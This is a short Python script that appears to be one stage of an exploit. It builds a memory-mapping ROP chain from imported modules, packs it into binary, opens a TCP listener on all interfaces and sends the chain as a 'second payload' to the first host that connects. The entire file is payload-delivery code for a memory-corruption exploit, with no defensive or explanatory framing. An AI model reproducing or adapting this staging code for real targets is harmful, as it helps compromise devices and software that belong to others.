from memory_mapping_ropchain import *
from tcp_ropchain import *
from config import *
import socket, time, struct

# Send second payload via tcp
rop_packet_mem = memory_mapping_ropchain()
rop_packet = struct.pack(">%iI" % len(rop_packet_mem), *rop_packet_mem)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', TCP_SERVER_PORT))
s.listen(1)
conn = s.accept()
print('Connected by ', conn[1])
conn[0].send(rop_packet)
